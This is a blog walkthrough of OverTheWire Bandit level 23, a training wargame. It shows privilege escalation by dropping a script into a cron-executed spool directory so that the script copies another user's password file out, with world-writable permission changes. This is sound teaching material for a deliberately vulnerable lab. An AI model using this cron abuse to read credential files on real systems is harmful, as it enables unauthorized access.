---
ShowToc: false
hiddenInList: true
title: "OverTheWire: Bandit - Level 23"
date: 2024-01-23
category: "Linux"
tags: ["CTF", "bandit", "overthewire", "walkthrough", "linux"]
prev:
  title: "Level 22"
  url: "/posts/overthewire/bandit/bandit22/"
next:
  title: "Level 24"
  url: "/posts/overthewire/bandit/bandit24/"
---

## Login

SSH: `ssh bandit23@bandit.labs.overthewire.org -p 2220`

Challenge URL: https://overthewire.org/wargames/bandit/bandit24.html


## Task

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

## Solution

The script will run as `bandit24` and it executes all the files in `/var/spool/bandit24/foo/` directory, then deletes them after a minute. We have to write a script to print bandit24's password and save it to a file so that the cron job will execute it.

```bash
mktemp -d
cd location
cat > script.sh
```

Script contents:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > password
```

Then:

```bash
chmod 777 script.sh
touch password
chmod 666 password
cp script.sh /var/spool/bandit24/foo/
cat password
```

Wait for a minute for the password to appear.

> **Note:** If the script says "no permission" when executed manually, try changing the permissions of the temp directory so that everybody can write to it.
